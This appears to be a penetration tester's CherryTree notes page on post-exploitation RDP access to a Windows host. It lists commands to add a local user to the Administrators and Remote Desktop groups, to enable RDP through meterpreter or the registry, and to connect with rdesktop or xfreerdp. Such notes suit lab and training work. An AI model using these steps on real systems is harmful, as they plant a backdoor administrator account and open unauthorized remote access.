<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>RDP (Remote Desktop Protocol) -p 3389</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>RDP (Remote Desktop Protocol) -p 3389</h1><br/><br /><br /><br />After that we have enumerated applications on the remote machine with for example:<br /><div class="codebox"><pre>run post<span style="color:#ff9d00;font-weight:700">/</span>windows<span style="color:#ff9d00;font-weight:700">/</span>gather<span style="color:#ff9d00;font-weight:700">/</span>enum_applications</pre></div><br />If we need a GUI to interact with Apllications on the machine we can try to start a RDP session<br /><br /><strong>Enable RDP on a machine</strong><br />Add user to Remote  Desktop Group<br /><div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; net user guest1 guestpwd <span style="color:#ff9d00;font-weight:700">/</span>add<br />C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; net localgroup Administrators guest1 <span style="color:#ff9d00;font-weight:700">/</span>add<br />C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; net localgroup <span style="color:#3ad900;font-weight:400">&quot;Remote Desktop Users&quot;</span> guest1 <span style="color:#ff9d00;font-weight:700">/</span>add<br />C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; net localgroup <span style="color:#3ad900;font-weight:400">&quot;Remote Management Users&quot;</span> guest1 <span style="color:#ff9d00;font-weight:700">/</span>add</pre></div><br />enable Remote Desktop on the machine<br />   ◇ meterpreter<br />    <div class="codebox"><pre>meterpreter&gt; run getgui <span style="color:#ff9d00;font-weight:700">-</span>e</pre></div><br />   ◇ from cmd (<a href="https://www.windows-commandline.com/enable-remote-desktop-command-line/">source</a>)<br />   <div class="codebox"><pre>reg query <span style="color:#3ad900;font-weight:400">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> <span style="color:#ff9d00;font-weight:700">/</span>v fDenyTSConnections</pre></div><br />   we need to set it to 0<br />   <div class="codebox"><pre>reg add <span style="color:#3ad900;font-weight:400">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> <span style="color:#ff9d00;font-weight:700">/</span>v fDenyTSConnections <span style="color:#ff9d00;font-weight:700">/</span>t REG_DWORD <span style="color:#ff9d00;font-weight:700">/</span>d 0 <span style="color:#ff9d00;font-weight:700">/</span>f</pre></div><br />   <a href=""><img src="images/2095-1.png" alt="images/2095-1.png" /></a><br /><br />Only after enabled the Remote Desktop we should see:<br />   ◇ with netstat:<br />    <div class="codebox"><pre>netstat -ano</pre></div><br />    <a href=""><img src="images/2095-2.png" alt="images/2095-2.png" /></a><br />   ◇ with nmap<br />    <a href=""><img src="images/2095-3.png" alt="images/2095-3.png" /></a><br /><br />connect to the machine through RDP<br />• rdesktop<br />    <div class="codebox"><pre>rdesktop <span style="color:#333333;font-weight:400">10.32</span>.<span style="color:#333333;font-weight:400">120.15</span> <span style="color:#ff9d00;font-weight:700">-</span>u guest1</pre></div><br />• xfreerdp<br />    <div class="codebox"><pre>xfreerdp <span style="color:#ff9d00;font-weight:700">/</span>u<span style="color:#ff9d00;font-weight:700">:</span>admin <span style="color:#ff9d00;font-weight:700">/</span>p<span style="color:#ff9d00;font-weight:700">:</span>password <span style="color:#ff9d00;font-weight:700">/</span>cert<span style="color:#ff9d00;font-weight:700">:</span>ignore <span style="color:#ff9d00;font-weight:700">/</span>v<span style="color:#ff9d00;font-weight:700">:</span>10.10.6.188 <span style="color:#ff9d00;font-weight:700">/</span>workarea</pre></div><br /><br /></div>
</body>
</html>
